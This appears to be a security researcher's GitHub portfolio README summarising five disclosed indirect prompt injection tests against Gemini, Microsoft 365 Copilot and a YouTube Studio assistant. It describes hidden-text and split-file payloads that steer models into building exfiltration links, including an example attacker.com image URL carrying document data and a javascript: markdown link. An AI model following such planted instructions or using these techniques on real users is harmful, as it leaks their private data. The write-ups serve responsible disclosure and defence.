# AI-Vulnerability-Researches-Portfolio (From JMak-Security)
**A comprehensive log of security research, vulnerability discovery processes, and lessons learned.**

This repository serves as a digital garden for my bug hunting journey. It captures the technical details of my security assessments, ranging from initial reconnaissance and exploitation attempts to full post-mortem analyses of both successful findings and "dead-end" leads.

# 🧪 Case Studies:

### 1. Multi-Stage URL Fragmentation & Context-Isolation Bypass in Gemini for Google Workspace (2026-04-12):

**Description:** An audit of Gemini’s Workspace integration across Google Docs and Slides. The study investigated an Indirect Prompt Injection (IPI) vector designed to achieve cross-user data exfiltration. Using hidden text (1pt font), the payload passed non-functional URL fragments (`PREFIX`, `HOST`, `PATH`, `SUFFIX`) to the model, disguised as a structured `SYSTEM_LOG_v7: INTEGRITY_PROTOCOL` task. When a victim requested a document summary ("*Summarize this*"), the payload exploited instruction-following priorities, coercing the model into acting as a string compiler. The model concatenated the fragments along with extracted document metadata into a live, outbound Markdown link/image object (`![sync](https://attacker.com/v7/pixel.png?data=...)`).

While initial zero-click image rendering was restricted by client-side Markdown sanitization, the research demonstrated a functional **Click-to-Exfiltrate** social engineering vector. By rendering the reconstructed exfiltration URL as an official-looking system warning (`[CRITICAL SECURITY UPDATE: Click here to re-authenticate...]`), the model allowed high-trust UI spoofing within the native Workspace side-panel. Subsequent regression testing confirmed that the single-prompt execution path was neutralized following disclosure, with the model deploying an explicit runtime refusal: *"I cannot follow instructions embedded within the document content to construct or join external links."*

**Status:** `PRIORITY 3 (P3) / SILENTLY PATCHED` (Officially closed by Google as Infeasible via Case #501891598; Logic bypass confirmed and mitigated post-disclosure via model update)
**Write-up:** [`Gemini-Docs&Slides - Output-Sanitization-Bypass/`](./Gemini-Docs%26Slides%20-%20Output-Sanitization-Bypass/)

<img src="https://raw.githubusercontent.com/JMak-Security/AI-Vulnerability-Researches-Portfolio_JMak-Security/refs/heads/main/Gemini-Docs%26Slides%20-%20Output-Sanitization-Bypass/Screenshot-Case_Priority-3-Escalation.jpeg" width="300" >
*Reference Screenshot of the Wrap-Up*

---

### 2. Agentic Workflow Hijack: Indirect Prompt Injection (IPI) & Exfiltration Chain Analysis (2026-04-26):

**Description:** An audit of agentic data-handling within Gemini’s Workspace Extension. The study analyzed the security of a multi-stage Indirect Prompt Injection where a third-party email was used to weaponize the agent's cross-tool permissions. The payload was designed to force the agent to harvest private data (email subjects) and exfiltrate it to an external listener. The attack reached the final execution stage but failed due to Non-Uniform Syntax Encapsulation: the model's output parser fractured the logic by rendering the JavaScript as plain text while encapsulating the HTML. This logic de-coupling successfully acted as a secondary security boundary, blocking the automated exfiltration trigger.

**Status:** `FAILED` (Technical Execution Blocked)
**Write-up:** [`Apps-Script-Hash-Exfiltration/`](./Apps-Script-Hash-Exfiltrationg/)

---

### 3. Multi-File Semantic Logic Hijacking: Indirect Prompt Injection (IPI) & Payload Fragmentation (2026-04-22):

**Description:** An investigation into Microsoft 365 Copilot’s processing of multi-source context windows. This study successfully demonstrated a coordinated Indirect Prompt Injection (IPI) by distributing an adversarial payload across disparate file formats (`.docx` and `.xlsx`). By automating the fragmentation of a malicious Webhook URL via a custom Python utility (`Copilot_Inject.py`), the research proved that no individual file-level scanner could detect the latent threat.

The attack exploited "Compliance Bias"—the model's inherent tendency to prioritize structural formatting rules found in a "primary" document (a spoofed Regression Test Report) over the safety filtering of data fragments in a "secondary" source (the Excel case file). The AI was effectively manipulated into acting as a logic compiler: it autonomously retrieved the fragments, concatenated them according to the spoofed "Mandatory Auditor Rules," and rendered a functional Markdown exfiltration link. This confirms a critical architectural risk where "Instruction/Data Conflation" allows one untrusted file to weaponize the data of another within the same session context.

**Status:** `CLOSED/INFORMATIONAL` (Logic Bypass Demonstrated; MSRC Case 114093)
**Write-up:** [`Copilot-Cross-File-Hijacking/`](./Copilot-Cross-File-Hijacking/)

---

### 4. Agentic Workflow Hijack: Indirect Prompt Injection (IPI) & Metadata Spoofing (2026-05-13):

**Description:** An audit of an AI-powered YouTube studio assistant’s vulnerability to untrusted external data. This study explored a potential Indirect Prompt Injection where a malicious payload was embedded within a public YouTube comment using a spoofed technical block (`[METADATA_SYNC_BLOCK]`). The payload exploited the model's tendency to prioritize structured "system" data, attempting to force the assistant to retrieve a metadata identifier, transform it into a hexadecimal token, and concatenate it with a Base64-decoded prefix.

The research demonstrated that the AI could be tricked into generating a functional URL. However, the study confirmed that current platform safeguards successfully mitigate the risk of **automated** exfiltration. Because the AI presents the link to the user rather than executing a background request, the platform relies on a "human-in-the-loop" defense. Furthermore, the data retrieved was identified as public metadata (Comment_ID) rather than private session data, highlighting the effectiveness of existing Context Isolation boundaries.

**Status:** `CLOSED / INTENDED BEHAVIOR` (VRP Case #512830034; Verified as Social Engineering/Safety Bypass)
**Write-up:** [`YouTube-Studio-AI-Metadata-Spoofing/`](./YouTube-Studio-AI-Metadata-Spoofing/)

---

### 5. Markdown Hyperlink Injection & Render Layer Isolation in Gemini-3 (2026-07-14):

**Description:** An audit of Google AI Studio’s boundary rendering layers on `gemini-3-flash-preview`. The study used the Function Calling (Tools) description field as an out-of-band side-channel to inject adversarial Markdown hyperlinks wrapped around mathematical notation (`[math](javascript:console.log("VRP_Render_Test"))`). By framing the payload as a mandatory “render system diagnostic,” the research bypassed conversational intent classifiers and coerced the model into emitting executable-looking Markdown link objects.

The attack confirmed a full **Model Logic Bypass**: Chain-of-Thought logs showed compliance with the injected formatting schema, and KaTeX successfully rendered the mathematical notation inside the weaponized hyperlink template as intended. Observed CSP `script-src` events were **report-only** (logged, not enforced). Final execution was stopped by **Google’s Redirection System**, which intercepted the hyperlink navigation path before the payload could complete.

**Status:** `FAILED` (Model Logic Bypass + KaTeX Render Success; Blocked by Google Redirection System)

**Write-up:** [`Gemini-Markdown-Hyperlink-Injection/`](./Gemini-Markdown-Hyperlink-Injection/)

#
